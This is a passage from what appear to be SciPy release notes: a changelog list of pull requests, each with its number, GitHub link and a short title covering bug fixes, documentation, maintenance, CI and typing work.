<https://github.com/scipy/scipy/pull/11488>`__: FIX: change \"func -> fun\" of scipy.optimize _root.py to solve...\n* `11489 <https://github.com/scipy/scipy/pull/11489>`__: BUG: fixes typo introduced in PR #11253 in stats.mstats.kendalltau()\n* `11490 <https://github.com/scipy/scipy/pull/11490>`__: DOC: fix typo in scipy/io/matlab/mio4.py\n* `11495 <https://github.com/scipy/scipy/pull/11495>`__: MAINT: refactor slsqp to fix issue in callback function\n* `11498 <https://github.com/scipy/scipy/pull/11498>`__: [DOC] mention graph cuts in maximum flow docstring\n* `11499 <https://github.com/scipy/scipy/pull/11499>`__: DOC: Improve documentation of scipy.signal.signaltools.wiener\n* `11506 <https://github.com/scipy/scipy/pull/11506>`__: DOC: Fix typo in documentation of scipy.stats.morestats\n* `11508 <https://github.com/scipy/scipy/pull/11508>`__: ENH: avoid copy on sparse __init__ when dtype is given\n* `11509 <https://github.com/scipy/scipy/pull/11509>`__: ENH: avoid unnecessary array copies in matrix product (again)\n* `11510 <https://github.com/scipy/scipy/pull/11510>`__: [DOC] An ex. for creating arbitrary size tri-diagonal\n* `11511 <https://github.com/scipy/scipy/pull/11511>`__: TST: pin numba for Travis/sparse\n* `11513 <https://github.com/scipy/scipy/pull/11513>`__: TST: disable NumPy cache dir ppc64le\n* `11514 <https://github.com/scipy/scipy/pull/11514>`__: BUG: make special.eval_genlaguerre return nan if passed nan\n* `11517 <https://github.com/scipy/scipy/pull/11517>`__: ENH: improve sparse.lil.tocsr performance\n* `11519 <https://github.com/scipy/scipy/pull/11519>`__: Fix fresnel documentation\n* `11520 <https://github.com/scipy/scipy/pull/11520>`__: BUG: make special.eval_gegenbauer return nan if passed nan\n* `11524 <https://github.com/scipy/scipy/pull/11524>`__: ENH: Cosine Sine Decomposition\n* `11526 <https://github.com/scipy/scipy/pull/11526>`__: BUG: fix SLSQP max iteration setting to fix #4921\n* `11527 <https://github.com/scipy/scipy/pull/11527>`__: ENH: improve docstring of weibull_min_gen and weibull_max_gen...\n* `11530 <https://github.com/scipy/scipy/pull/11530>`__: MAINT: Removed 3 unused imports, 3 unused assignments from ndimage.\n* `11531 <https://github.com/scipy/scipy/pull/11531>`__: DOC: fix typos in bdtr and bdtrc from gh PR 11045\n* `11532 <https://github.com/scipy/scipy/pull/11532>`__: MAINT: Fixed several unused imports and unused assignments from...\n* `11533 <https://github.com/scipy/scipy/pull/11533>`__: MAINT: Fixed about 100 unused imports, unused assignment warnings...\n* `11534 <https://github.com/scipy/scipy/pull/11534>`__: FIX: Allow non-native byte order inputs to scipy.fft\n* `11535 <https://github.com/scipy/scipy/pull/11535>`__: MAINT: Fixed several unused imports in _lib.\n* `11536 <https://github.com/scipy/scipy/pull/11536>`__: MAINT: Fixed several unused imports and unused assignments in...\n* `11537 <https://github.com/scipy/scipy/pull/11537>`__: MAINT: Removed an unused import in scipy/constants.\n* `11538 <https://github.com/scipy/scipy/pull/11538>`__: MAINT: Fixed several unused imports in scipy/fft.\n* `11539 <https://github.com/scipy/scipy/pull/11539>`__: MAINT: Fixed several unused imports and unused assignments in...\n* `11540 <https://github.com/scipy/scipy/pull/11540>`__: MAINT: Fixed two unused imports in scipy/misc.\n* `11541 <https://github.com/scipy/scipy/pull/11541>`__: MAINT: Fixed several unused imports and unused assignments in...\n* `11542 <https://github.com/scipy/scipy/pull/11542>`__: MAINT: Fixed an unused import in scipy/odr.\n* `11543 <https://github.com/scipy/scipy/pull/11543>`__: MAINT: Fixed several unused imports and unused assignments in...\n* `11544 <https://github.com/scipy/scipy/pull/11544>`__: MAINT: Fixed unused imports and unused assignments in scipy/integrate.\n* `11545 <https://github.com/scipy/scipy/pull/11545>`__: MAINT: Removed unused imports and fixed unused assignments in...\n* `11546 <https://github.com/scipy/scipy/pull/11546>`__: MAINT: Removed unused imports; fixed unused assignments in scipy/signal.\n* `11547 <https://github.com/scipy/scipy/pull/11547>`__: MAINT: Removed unused imports; fixed unused assignments in scipy/spatial\n* `11548 <https://github.com/scipy/scipy/pull/11548>`__: MAINT: Removed unused imports; fixed unused assignments in scipy.sparse.\n* `11549 <https://github.com/scipy/scipy/pull/11549>`__: MAINT: Replace xrange with range\n* `11560 <https://github.com/scipy/scipy/pull/11560>`__: MAINT: stats: remove an _argcheck call\n* `11573 <https://github.com/scipy/scipy/pull/11573>`__: MAINT: Removed unused imports; fixed unused assignments in scipy/stats.\n* `11574 <https://github.com/scipy/scipy/pull/11574>`__: MAINT: Small change to \\`optimize.nnls\\` error messages.\n* `11575 <https://github.com/scipy/scipy/pull/11575>`__: MAINT: Update sytrd/hetrd tests\n* `11582 <https://github.com/scipy/scipy/pull/11582>`__: MAINT: fix typo in quadpack.py closes #11448\n* `11585 <https://github.com/scipy/scipy/pull/11585>`__: TST: add openblas_support.py\n* `11587 <https://github.com/scipy/scipy/pull/11587>`__: BUG: Differential evolution with LinearConstraint with sparse...\n* `11588 <https://github.com/scipy/scipy/pull/11588>`__: MAINT: Fully display problem size in lsmr/lsqr.\n* `11589 <https://github.com/scipy/scipy/pull/11589>`__: MAINT: Remove Python 2 workarounds\n* `11590 <https://github.com/scipy/scipy/pull/11590>`__: MAINT: Remove Python2 module init\n* `11605 <https://github.com/scipy/scipy/pull/11605>`__: Standardization of bounds in _linprog_util.py\n* `11608 <https://github.com/scipy/scipy/pull/11608>`__: BUG: fix use of is in DE callback\n* `11614 <https://github.com/scipy/scipy/pull/11614>`__: TST, MAINT: TestCtypesQuad skip with pytest\n* `11619 <https://github.com/scipy/scipy/pull/11619>`__: ENH: add nan_policy argument and functionality to stats.mstats.winsorize\n* `11621 <https://github.com/scipy/scipy/pull/11621>`__: MAINT: Cleanup uses of PY_VERSION_HEX, NPY_PY3K in ndimage\n* `11622 <https://github.com/scipy/scipy/pull/11622>`__: MAINT: Cleanup uses of PY_VERSION_HEX, NPY_PY3K in sparse\n* `11623 <https://github.com/scipy/scipy/pull/11623>`__: MAINT: Remove unnecessary 'from __future__ import ...' statements\n* `11626 <https://github.com/scipy/scipy/pull/11626>`__: MAINT: Cleanup uses of PY_VERSION_HEX\n* `11627 <https://github.com/scipy/scipy/pull/11627>`__: ENH: add analytic formula for normal moments\n* `11628 <https://github.com/scipy/scipy/pull/11628>`__: MAINT, TST: adjust azure for matplotlib release\n* `11631 <https://github.com/scipy/scipy/pull/11631>`__: Revert to old behaviour for constant cost matrices in \\`linear_sum_assignment\\`\n* `11632 <https://github.com/scipy/scipy/pull/11632>`__: MAINT: Define ARRAY_ANYORDER with DEF instead of cdef\n* `11639 <https://github.com/scipy/scipy/pull/11639>`__: BUG: interpolate/interp1d: fail gracefully on all-nan inputs\n* `11640 <https://github.com/scipy/scipy/pull/11640>`__: MAINT: Fix BLAS3 trmm wrapper for \"side\" arg\n* `11642 <https://github.com/scipy/scipy/pull/11642>`__: TST, MAINT: remove dead code in Travis CI\n* `11643 <https://github.com/scipy/scipy/pull/11643>`__: MAINT: fix conversion in binom_test\n* `11645 <https://github.com/scipy/scipy/pull/11645>`__: MAINT: Assorted clean up.\n* `11646 <https://github.com/scipy/scipy/pull/11646>`__: MAINT: Remove unnecessary 'from __future__ import ...' statements\n* `11647 <https://github.com/scipy/scipy/pull/11647>`__: DOC: document return_all arguments\n* `11648 <https://github.com/scipy/scipy/pull/11648>`__: Perform geometric slerp in quaternion space\n* `11651 <https://github.com/scipy/scipy/pull/11651>`__: DOC: Update paper URL in lambertw documentation\n* `11653 <https://github.com/scipy/scipy/pull/11653>`__: PERF: Switch to C++ STL std::nth_element\n* `11655 <https://github.com/scipy/scipy/pull/11655>`__: MAINT: Remove Python2 cStringStream\n* `11657 <https://github.com/scipy/scipy/pull/11657>`__: ENH: Add wrapper for ?pttrf/?pttrs\n* `11664 <https://github.com/scipy/scipy/pull/11664>`__: ENH: Add wrapper for ?gejsv\n* `11665 <https://github.com/scipy/scipy/pull/11665>`__: ENH: Add wrapper for ?pteqr\n* `11667 <https://github.com/scipy/scipy/pull/11667>`__: BUG: Non-central Fisher distribution (fix nan-values when nc=0)\n* `11668 <https://github.com/scipy/scipy/pull/11668>`__: ENH: Add wrapper for ?gtsvx\n* `11671 <https://github.com/scipy/scipy/pull/11671>`__: TST, CI: restore Azure temporarily\n* `11672 <https://github.com/scipy/scipy/pull/11672>`__: Add warning to medfilt when array size < kernel_size\n* `11674 <https://github.com/scipy/scipy/pull/11674>`__: TST: bump test precision for two np.dot related linalg tests.\n* `11675 <https://github.com/scipy/scipy/pull/11675>`__: MAINT: pycodestyle clean-up\n* `11677 <https://github.com/scipy/scipy/pull/11677>`__: ENH: Add wrapper for ?ptsvx\n* `11679 <https://github.com/scipy/scipy/pull/11679>`__: BENCH: cKDTree benchmarks added: balanced/unbalanced tree (related...\n* `11680 <https://github.com/scipy/scipy/pull/11680>`__: MAINT: rng_integers allows RandomState.randint or Generator.integers\n* `11683 <https://github.com/scipy/scipy/pull/11683>`__: BUG: fix mode='mirror' on length 1 axes\n* `11684 <https://github.com/scipy/scipy/pull/11684>`__: BUG: fix scipy.special.voigt_profile\n* `11687 <https://github.com/scipy/scipy/pull/11687>`__: MAINT: sparse.linalg: avoid importing from \\`np.core\\`\n* `11688 <https://github.com/scipy/scipy/pull/11688>`__: ENH: mypy: get specific about ignoring missing imports\n* `11690 <https://github.com/scipy/scipy/pull/11690>`__: MAINT: mypy: fix errors about incompatible types in lists\n* `11692 <https://github.com/scipy/scipy/pull/11692>`__: MAINT: mypy: fix remaining type errors\n* `11694 <https://github.com/scipy/scipy/pull/11694>`__: TST, MAINT: bump to OpenBLAS 0.3.9 stable, raise tol for Win...\n* `11697 <https://github.com/scipy/scipy/pull/11697>`__: DOC: fix pdf of norminvgauss in scipy.stats\n* `11701 <https://github.com/scipy/scipy/pull/11701>`__: MAINT: special: add rudimentary types for \\`_ufuncs\\` extension...\n* `11702 <https://github.com/scipy/scipy/pull/11702>`__: BUG: Fixed a post-merge bug for eigh()\n* `11703 <https://github.com/scipy/scipy/pull/11703>`__: Improves docstring with consistent L2-norm\n* `11705 <https://github.com/scipy/scipy/pull/11705>`__: DOC: Slerp the SphericalVoronoi docstring\n* `11706 <https://github.com/scipy/scipy/pull/11706>`__: ENH: mypy: add \\`--mypy\\` option to \\`runtests.py\\`\n* `11710 <https://github.com/scipy/scipy/pull/11710>`__: ENH: Modified stats.kstest() to use the exact stats.kstwo.sf()...\n* `11715 <https://github.com/scipy/scipy/pull/11715>`__: DOC: add .. versionadded:: to as_matrix/from_matrix in spatial/transf\u2026\n* `11716 <https://github.com/scipy/scipy/pull/11716>`__: BENCH: fix benchmark imports for \\`\\`optimize_linprog.py\\`\\`\n* `11721 <https://github.com/scipy/scipy/pull/11721>`__: MAINT: io: Remove now-unnecessary \\`# type: ignore\\`\n* `11722 <https://github.com/scipy/scipy/pull/11722>`__: MAINT: mypy: remove mpmath from the ratchet\n* `11726 <https://github.com/scipy/scipy/pull/11726>`__: Handle constant input for scipy.stats.f_oneway\n* `11729 <https://github.com/scipy/scipy/pull/11729>`__: BENCH: optimize: added infeasible benchmarks for linprog\n* `11731 <https://github.com/scipy/scipy/pull/11731>`__: fix inaccurate information about Mac OS compiler (#11696)\n* `11733 <https://github.com/scipy/scipy/pull/11733>`__: Fix inaccurate docstring example of HalfspaceIntersection\n* `11734 <https://github.com/scipy/scipy/pull/11734>`__: Doc: fix inaccurate docstring of SmoothBivariateSpline.\n* `11735 <https://github.com/scipy/scipy/pull/11735>`__: Bug: stats: fix wrong shape from median_absolute_deviation for...\n* `11736 <https://github.com/scipy/scipy/pull/11736>`__: ENH: add input validations and its tests for FITPACK in fitpack2.py\n* `11737 <https://github.com/scipy/scipy/pull/11737>`__: BUG: Prevent crashes due to MKL bug in ?heevr\n* `11739 <https://github.com/scipy/scipy/pull/11739>`__: MAINT: special: add type stubs for \\`_test_round.pyx\\`\n* `11740 <https://github.com/scipy/scipy/pull/11740>`__: MAINT: special: remove unused specfun f2py wrappers\n* `11741 <https://github.com/scipy/scipy/pull/11741>`__: BUG: fix small tolerances handling for minpack and add a test.\n* `11743 <https://github.com/scipy/scipy/pull/11743>`__: Doc: fix docstring of rfft, rfft2, rfftn, irfft, irfft2, irfftn...\n* `11744 <https://github.com/scipy/scipy/pull/11744>`__: MAINT: Remove unused py3k.h code\n* `11745 <https://github.com/scipy/scipy/pull/11745>`__: DOC: stats: Clean up ncf documentation.\n* `11748 <https://github.com/scipy/scipy/pull/11748>`__: MAINT: special: type \\`cython_special\\` as \\`Any\\`\n* `11750 <https://github.com/scipy/scipy/pull/11750>`__: MAINT: type hints for \\`_spherical_voronoi\\`\n* `11752 <https://github.com/scipy/scipy/pull/11752>`__: DOC: fix docstring of scipy.optimize.least_squares\n* `11753 <https://github.com/scipy/scipy/pull/11753>`__: ENH: add input validation for dendrogram and a test.\n* `11755 <https://github.com/scipy/scipy/pull/11755>`__: MAINT: Replace uses of tostring with tobytes\n* `11757 <https://github.com/scipy/scipy/pull/11757>`__: ENH: improve binned_statistics_2d performance.\n* `11759 <https://github.com/scipy/scipy/pull/11759>`__: ENH: optimize: add HiGHS methods to linprog\n* `11760 <https://github.com/scipy/scipy/pull/11760>`__: MAINT: Remove FileStream replaced by GenericStream\n* `11761 <https://github.com/scipy/scipy/pull/11761>`__: MAINT: Replace npy_3kcompat.h shims\n* `11765 <https://github.com/scipy/scipy/pull/11765>`__: TST: Speedup test_pascal which is VERY slow on Azure\n* `11766 <https://github.com/scipy/scipy/pull/11766>`__: TST: speed up differential_evolution L8 test\n* `11767 <https://github.com/scipy/scipy/pull/11767>`__: Change comment in continuous rv gamma fit function\n* `11776 <https://github.com/scipy/scipy/pull/11776>`__: Add domain option for resample.\n* `11784 <https://github.com/scipy/scipy/pull/11784>`__: BUG: Fixed calculation of nonzero elements in scipy.sparse.random\n* `11786 <https://github.com/scipy/scipy/pull/11786>`__: ENH: stats: add axis keyword argument to scipy.stats.rankdata\n* `11789 <https://github.com/scipy/scipy/pull/11789>`__: Doc: fix docstring of scipy.spatial.chebyshev\n* `11792 <https://github.com/scipy/scipy/pull/11792>`__: DOC: dev: add guidelines for developing public Cython APIs\n* `11794 <https://github.com/scipy/scipy/pull/11794>`__: MAINT: add comments explaining a problem in cython_optimize organization\n* `11796 <https://github.com/scipy/scipy/pull/11796>`__: DOC: add a note about precision losing in csgraph.minimum_spanning_tree...\n* `11797 <https://github.com/scipy/scipy/pull/11797>`__: ENH: Allow negative \\`axis\\` in \\`interpolate.BSpline\\`. Also...\n* `11798 <https://github.com/scipy/scipy/pull/11798>`__: Add simplify_cells parameter to scipy.io.loadmat\n* `11801 <https://github.com/scipy/scipy/pull/11801>`__: MAINT, DOC: minor changes of ratio-of-uniforms in scipy.stats\n* `11802 <https://github.com/scipy/scipy/pull/11802>`__: BUG: fix scipy.odr to handle multidimensional independent and...\n* `11803 <https://github.com/scipy/scipy/pull/11803>`__: scipy.stats.trapz: Use analytic formulas for stats and entropy.\n* `11808 <https://github.com/scipy/scipy/pull/11808>`__: DOC: add Examples in the scipy.interpolate.interpn docstring.\n* `11809 <https://github.com/scipy/scipy/pull/11809>`__: Duplicate entries are added together in csr_matrix constructor\n* `11813 <https://github.com/scipy/scipy/pull/11813>`__: MAINT: bump pyflakes to version 2.1.1\n* `11814 <https://github.com/scipy/scipy/pull/11814>`__: BUG: scipy.sparse.csr doctest failing with incorrect output value\n* `11817 <https://github.com/scipy/scipy/pull/11817>`__: DOC: add Examples in the scipy.optimize.leastsq docstring\n* `11820 <https://github.com/scipy/scipy/pull/11820>`__: ENH: Raise an error on incorrect bounds format in optimize.fmin_l_bfgs_b\n* `11822 <https://github.com/scipy/scipy/pull/11822>`__: CI: add github actions for macOS\n* `11824 <https://github.com/scipy/scipy/pull/11824>`__: DOC: add Examples in scipy.optimize.line_search docstring (line_search_wolfe2)\n* `11830 <https://github.com/scipy/scipy/pull/11830>`__: TST: Always use fork for multiprocessing in fft tests\n* `11831 <https://github.com/scipy/scipy/pull/11831>`__: DOC: add Examples and Returns in scipy.misc.central_diff_weights...\n* `11832 <https://github.com/scipy/scipy/pull/11832>`__: DOC: stats: Some small corrections to a couple docstrings.\n* `11833 <https://github.com/scipy/scipy/pull/11833>`__: BUG: Fix compiler_name when there are paths used in flags\n* `11836 <https://github.com/scipy/scipy/pull/11836>`__: MAINT: re-introduce multiprocessing tests on Python3.8\n* `11837 <https://github.com/scipy/scipy/pull/11837>`__: Doc: add Examples in scipy.optimize.fsolve docstring\n* `11838 <https://github.com/scipy/scipy/pull/11838>`__: Doc: add Examples in scipy.sparse.linalg.minres docstring\n* `11840 <https://github.com/scipy/scipy/pull/11840>`__: BUG: sparse.linalg: fix overflow in expm intermediate computation\n* `11842 <https://github.com/scipy/scipy/pull/11842>`__: BLD: fix build with gfortran 10\n* `11843 <https://github.com/scipy/scipy/pull/11843>`__: MAINT: Simplify floats in constants.py\n* `11847 <https://github.com/scipy/scipy/pull/11847>`__: DOC: add a tutorial of scipy.optimize.linprog\n* `11849 <https://github.com/scipy/scipy/pull/11849>`__: ENH: speed up geninvgauss by using cython\n* `11852 <https://github.com/scipy/scipy/pull/11852>`__: CI: remove osx from travisCI\n* `11857 <https://github.com/scipy/scipy/pull/11857>`__: BUG: Change parameter fc of gausspulse to float.\n* `11861 <https://github.com/scipy/scipy/pull/11861>`__: order = degree + 1 for splines\n* `11863 <https://github.com/scipy/scipy/pull/11863>`__: Make g77 ABI wrapper work with gfortran ABI lapack\n* `11866 <https://github.com/scipy/scipy/pull/11866>`__: MAINT: add type ignores to sympy and matplotlib imports\n* `11867 <https://github.com/scipy/scipy/pull/11867>`__: CI: Add arm64 in travis-ci\n* `11869 <https://github.com/scipy/scipy/pull/11869>`__: DOC: signal: Add an example to the lsim2 docstring.\n* `11870 <https://github.com/scipy/scipy/pull/11870>`__: DOC: signal: Use impulse instead of impulse2 in the impulse example...\n* `11871 <https://github.com/scipy/scipy/pull/11871>`__: ENH: type ufuncs in special as ufuncs instead of Any\n* `11872 <https://github.com/scipy/scipy/pull/11872>`__: BUG: avoid recomputing in scipy.optimize.optimize.MemoizeJac\n* `11873 <https://github.com/scipy/scipy/pull/11873>`__: DOC: signal: Fix ODE in impulse and impulse2 docstrings.\n* `11874 <https://github.com/scipy/scipy/pull/11874>`__: DOC: add Examples of docstring for scipy.interpolate.approximate_taylor_polynomial\n* `11878 <https://github.com/scipy/scipy/pull/11878>`__: DOC: fixed a typo under scipy/integrate/quadrature.py\n* `11879 <https://github.com/scipy/scipy/pull/11879>`__: BUG: Fix index arrays overflow in sparse.kron\n* `11880 <https://github.com/scipy/scipy/pull/11880>`__: DOC: stats: Add Examples for bartlett, fligner, levene.\n* `11881 <https://github.com/scipy/scipy/pull/11881>`__: MAINT: normalise numpy-->np in optimize.py\n* `11882 <https://github.com/scipy/scipy/pull/11882>`__: DOC: add Examples for scipy.io.readsav docstring.\n* `11883 <https://github.com/scipy/scipy/pull/11883>`__: DOC: add Returns and Examples for scipy.ndimage.correlate() docstring\n* `11885 <https://github.com/scipy/scipy/pull/11885>`__: BUG: stats: Handle multidimensional arrays in f_oneway, and more.\n* `11889 <https://github.com/scipy/scipy/pull/11889>`__: DOC: signal: Unify lsim and lsim2 examples.\n* `11896 <https://github.com/scipy/scipy/pull/11896>`__: BUG: stats: Fix handling of size 0 inputs for ttest_rel and ttest_ind.\n* `11897 <https://github.com/scipy/scipy/pull/11897>`__: DOC: Remove misleading default values from fit method\n* `11898 <https://github.com/scipy/scipy/pull/11898>`__: MAINT: LinearVectorFunction.J is ndarray closes #11886\n* `11902 <https://github.com/scipy/scipy/pull/11902>`__: BUG: linalg: test_heequb failure\n* `11904 <https://github.com/scipy/scipy/pull/11904>`__: fix real-to-real transforms for complex inputs and overwrite_x=True\n* `11906 <https://github.com/scipy/scipy/pull/11906>`__: DOC: stats: fix error caused by trapz docstring\n* `11907 <https://github.com/scipy/scipy/pull/11907>`__: BUG: stats: fixed SEGFAULT from Issue #9710\n* `11912 <https://github.com/scipy/scipy/pull/11912>`__: ENH: Respect matplotlib color palette with hierarchy/dendrogram.\n* `11914 <https://github.com/scipy/scipy/pull/11914>`__: DOC: refine doc for spatial.distance.squareform\n* `11915 <https://github.com/scipy/scipy/pull/11915>`__: ENH: Ndim linear operator\n* `11919 <https://github.com/scipy/scipy/pull/11919>`__: ENH: expose \"window_size\" parameter in find_peaks_cwt()\n* `11920 <https://github.com/scipy/scipy/pull/11920>`__: DOC: explain M, diffev\n* `11923 <https://github.com/scipy/scipy/pull/11923>`__: CI: macOS install swig closes #11922\n* `11924 <https://github.com/scipy/scipy/pull/11924>`__: DOC: add Examples for scipy.optimize.bracket() docstring\n* `11930 <https://github.com/scipy/scipy/pull/11930>`__: DOC: add Examples and clean up for signal.qspline1d and signal.qspline_eval...\n* `11931 <https://github.com/scipy/scipy/pull/11931>`__: DOC: add Examples for sparse.linalg.bicg docstring.\n* `11933 <https://github.com/scipy/scipy/pull/11933>`__: DOC: Add original reference for Yao-Liu objective functions\n* `11934 <https://github.com/scipy/scipy/pull/11934>`__: DOC, MAINT: mailmap update\n* `11935 <https://github.com/scipy/scipy/pull/11935>`__: DOC: make scipy.stats.mode documentation reflect that the function...\n* `11936 <https://github.com/scipy/scipy/pull/11936>`__: ENH: special: add type stubs for \\`orthogonal.py\\`\n* `11937 <https://github.com/scipy/scipy/pull/11937>`__: DOC: Add docstring examples to fft2, ifft2, io.savemat\n* `11938 <https://github.com/scipy/scipy/pull/11938>`__: MAINT: add helper function for deprecating Cython API functions\n* `11942 <https://github.com/scipy/scipy/pull/11942>`__: MAINT: ignore conditional import in _lib/_util\n* `11943 <https://github.com/scipy/scipy/pull/11943>`__: MAINT: special: add types for geterr/seterr/errstate\n* `11946 <https://github.com/scipy/scipy/pull/11946>`__: MAINT: add py.typed marker\n* `11950 <https://github.com/scipy/scipy/pull/11950>`__: TST:MAINT: separated and stabilized heequb tests\n* `11952 <https://github.com/scipy/scipy/pull/11952>`__: DOC: update toolchain roadmap for py38, C99, C++11/14\n* `11957 <https://github.com/scipy/scipy/pull/11957>`__: MAINT: Use np.errstate context manager instead of np.seterr.\n* `11958 <https://github.com/scipy/scipy/pull/11958>`__: MAINT: interpolate: Remove some trailing spaces.\n* `11960 <https://github.com/scipy/scipy/pull/11960>`__: MAINT: Cleanup Python2 compatibility code\n* `11961 <https://github.com/scipy/scipy/pull/11961>`__: MAINT: Remove numpy/npy_3kcompat.h from _superluobject.c\n* `11962 <https://github.com/scipy/scipy/pull/11962>`__: DOC: Fix type of \\`codes\\` in docstring of \\`_vq._vq()\\`\n* `11964 <https://github.com/scipy/scipy/pull/11964>`__: MAINT: Cleanup unused IS_PYPY\n* `11969 <https://github.com/scipy/scipy/pull/11969>`__: DOC: add Examples and fix docstring for special.airye\n* `11970 <https://github.com/scipy/scipy/pull/11970>`__: BUG: sparse: 'diagonal' of sparse matrices fixed to match numpy's...\n* `11974 <https://github.com/scipy/scipy/pull/11974>`__: BUG: Reshape oaconvolve output even when no axes are convolved\n* `11976 <https://github.com/scipy/scipy/pull/11976>`__: MAINT: add logo for github actions\n* `11977 <https://github.com/scipy/scipy/pull/11977>`__: CI: test bleeding edge Python\n* `11979 <https://github.com/scipy/scipy/pull/11979>`__: DOC: add Examples for stats.ranksums() docstring.\n* `11982 <https://github.com/scipy/scipy/pull/11982>`__: Fix KMeans++ initialisation slowness\n* `11983 <https://github.com/scipy/scipy/pull/11983>`__: DOC: add Examples for stats.mstats.argstoarray() docstring.\n* `11986 <https://github.com/scipy/scipy/pull/11986>`__: Avoid bugs in ndimage when the output and input arrays overlap...\n* `11988 <https://github.com/scipy/scipy/pull/11988>`__: ENH: Override fit method of Laplace distribution with Maximum...\n* `11993 <https://github.com/scipy/scipy/pull/11993>`__: TST, CI: Azure Windows path fixups\n* `11995 <https://github.com/scipy/scipy/pull/11995>`__: MAINT, CI: remove custom mingw Azure\n* `11996 <https://github.com/scipy/scipy/pull/11996>`__: DOC: add Examples and fix pep warning for fft.set_global_backend...\n* `11997 <https://github.com/scipy/scipy/pull/11997>`__: MAINT, CI: Azure OpenBLAS simplify\n* `11998 <https://github.com/scipy/scipy/pull/11998>`__: BENCH: Run against current HEAD instead of master\n* `12001 <https://github.com/scipy/scipy/pull/12001>`__: ENH: stats: Implement _logpdf for the maxwell distribution.\n* `12004 <https://github.com/scipy/scipy/pull/12004>`__: DOC: add examples for integrate.quad_vec() and integrate.quad_explain()\n* `12005 <https://github.com/scipy/scipy/pull/12005>`__: MAINT: Use helper functions in ?tbtrs tests\n* `12007 <https://github.com/scipy/scipy/pull/12007>`__: MAINT: updated LICENSES_bundled for pybind11 and six\n* `12008 <https://github.com/scipy/scipy/pull/12008>`__: DOC: roadmap update\n* `12009 <https://github.com/scipy/scipy/pull/12009>`__: ENH: optimize: support 64-bit BLAS in lbfgsb\n* `12010 <https://github.com/scipy/scipy/pull/12010>`__: ENH: sparse.linalg: support 64-bit BLAS in isolve\n* `12012 <https://github.com/scipy/scipy/pull/12012>`__: DOC: add Examples for interpolate.barycentric_interpolate(),...\n* `12013 <https://github.com/scipy/scipy/pull/12013>`__: MAINT: remove last uses of numpy.dual\n* `12014 <https://github.com/scipy/scipy/pull/12014>`__: CI: print 10 slowest tests\n* `12020 <https://github.com/scipy/scipy/pull/12020>`__: MAINT: Removed handling of circular input in SphericalVoronoi\n* `12022 <https://github.com/scipy/scipy/pull/12022>`__: DOC : added default value of absolute_sigma to False in scipy.optimize.curve_fit docs\n* `12024 <https://github.com/scipy/scipy/pull/12024>`__: DOC: add Examples for io.hb_read() and io.hb_write()\n* `12025 <https://github.com/scipy/scipy/pull/12025>`__: MAINT: Remove numpy/npy_3kcompat.h from nd_image\n* `12028 <https://github.com/scipy/scipy/pull/12028>`__: Spelling correction\n* `12030 <https://github.com/scipy/scipy/pull/12030>`__: ENH: optimize/_trlib: support ILP64 blas/lapack\n* `12036 <https://github.com/scipy/scipy/pull/12036>`__: MAINT: Add some generated C files .gitignore\n* `12038 <https://github.com/scipy/scipy/pull/12038>`__: MAINT, CI: Travis rackcdn->conda.org\n* `12039 <https://github.com/scipy/scipy/pull/12039>`__: MAINT: signal: Lower the resolution of the plots in the chirp...\n* `12040 <https://github.com/scipy/scipy/pull/12040>`__: DOC: add Examples for ndimage.spline_filter1d() and spline_filter()...\n* `12044 <https://github.com/scipy/scipy/pull/12044>`__: MAINT: combine apt-get update and apt-get install into one RUN\n* `12045 <https://github.com/scipy/scipy/pull/12045>`__: TST: Reduce size of test_diagonal_types to speed up tests\n* `12046 <https://github.com/scipy/scipy/pull/12046>`__: MAINT: Remove unused npy_3kcompat.h\n* `12047 <https://github.com/scipy/scipy/pull/12047>`__: MAINT: Cython 3.0 compat\n* `12050 <https://github.com/scipy/scipy/pull/12050>`__: DOC: add download number badges of PyPI and conda-forge in README.rst\n* `12052 <https://github.com/scipy/scipy/pull/12052>`__: DOC: add Examples odr.models.polynomial() and fix odr.odr docstring...\n* `12056 <https://github.com/scipy/scipy/pull/12056>`__: ENH: Modifies shapiro to return a named tuple\n* `12057 <https://github.com/scipy/scipy/pull/12057>`__: Adding my name into THANKS.txt\n* `12060 <https://github.com/scipy/scipy/pull/12060>`__: TST: Reduce number of test_diagonal_types configs\n* `12062 <https://github.com/scipy/scipy/pull/12062>`__: TST: Change dec.slow to pytest.mark.slow\n* `12068 <https://github.com/scipy/scipy/pull/12068>`__: ENH: Modifies jarque_bera to return a named tuple\n* `12070 <https://github.com/scipy/scipy/pull/12070>`__: MAINT, CI: appveyor rack->conda.org\n* `12072 <https://github.com/scipy/scipy/pull/12072>`__: TST: filter out factorial(float) deprecation warning\n* `12078 <https://github.com/scipy/scipy/pull/12078>`__: TST: Skip test on colab with large memory alloc\n* `12079 <https://github.com/scipy/scipy/pull/12079>`__: DOC: Remove Python2 reference from stats tutorial\n* `12081 <https://github.com/scipy/scipy/pull/12081>`__: DOC: add Examples docstring for optimize.show_options()\n* `12084 <https://github.com/scipy/scipy/pull/12084>`__: BUG: interpolate: fix BarycentricInterpolator with integer input...\n* `12089 <https://github.com/scipy/scipy/pull/12089>`__: ENH: spatial/qhull: support ILP64 Lapack\n* `12090 <https://github.com/scipy/scipy/pull/12090>`__: ENH: integrate: support ILP64 BLAS in odeint/vode/lsoda\n* `12091 <https://github.com/scipy/scipy/pull/12091>`__: ENH: integrate: support ILP64 in quadpack\n* `12092 <https://github.com/scipy/scipy/pull/12092>`__: BUG: Fix dropping dt in signal.StateSpace\n* `12093 <https://github.com/scipy/scipy/pull/12093>`__: MAINT: Rollback python2.6 workaround\n* `12094 <https://github.com/scipy/scipy/pull/12094>`__: MAINT: \\`openblas_support\\` hash checks\n* `12095 <https://github.com/scipy/scipy/pull/12095>`__: MAINT: ndimage: change \\`shares_memory\\` to \\`may_share_memory\\`\n* `12098 <https://github.com/scipy/scipy/pull/12098>`__: Doc: change 4 model instances of odr to be instances of \\`Model\\`...\n* `12101 <https://github.com/scipy/scipy/pull/12101>`__: Removed more unused imports and assignments.\n* `12107 <https://github.com/scipy/scipy/pull/12107>`__: ENH: Area calculation for 2D inputs in SphericalVoronoi\n* `12108 <https://github.com/scipy/scipy/pull/12108>`__: MAINT: ensure attributes have correct data type in \\`SphericalVoronoi\\`\n* `12109 <https://github.com/scipy/scipy/pull/12109>`__: degree is not order in splines\n* `12110 <https://github.com/scipy/scipy/pull/12110>`__: ENH: More helpful/forgiving io.wavfile errors\n* `12117 <https://github.com/scipy/scipy/pull/12117>`__: BUG: fix newline\n* `12123 <https://github.com/scipy/scipy/pull/12123>`__: [MAINT] Fix error on PyData/Sparse import.\n* `12124 <https://github.com/scipy/scipy/pull/12124>`__: TST: Always test matmul now that Python3.5+ is required\n* `12126 